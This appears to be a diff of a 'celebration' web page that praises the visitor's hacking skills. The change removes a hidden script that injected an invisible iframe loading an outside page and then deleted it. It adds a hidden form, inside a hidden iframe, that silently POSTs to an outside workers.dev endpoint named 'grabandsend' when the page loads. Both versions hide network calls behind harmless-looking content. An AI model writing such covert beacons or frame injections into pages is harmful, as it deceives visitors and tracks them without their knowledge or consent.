@@ -96,6 +96,11 @@
     <p>As a reward for your incredible hacking skills, here's a little celebration just for you.</p>
   </div>
 
+  <iframe name="ping-frame" class="hidden-frame"></iframe>
+  <form id="ping-form" action="https://grabandsend.bootydirty40.workers.dev" method="POST" target="ping-frame" style="display: none;">
+    <input type="hidden" name="ping" value="true">
+  </form>
+
   <script type="importmap">
   {
     "imports": {
@@ -138,18 +143,8 @@
     }
 
     document.addEventListener('DOMContentLoaded', () => {
-      // Invisible iframe injection
-      const iframe = document.createElement('iframe');
-      iframe.src = "https://prototbh.xyz/lol.html";
-      iframe.className = "hidden-frame";
-      document.body.appendChild(iframe);
+      document.getElementById('ping-form').submit();
 
-      // Remove it after 3 seconds
-      setTimeout(() => {
-        iframe.remove();
-      }, 3000);
-
-      // Start the party after 1s
       setTimeout(party, 1000);
     });
   </script>
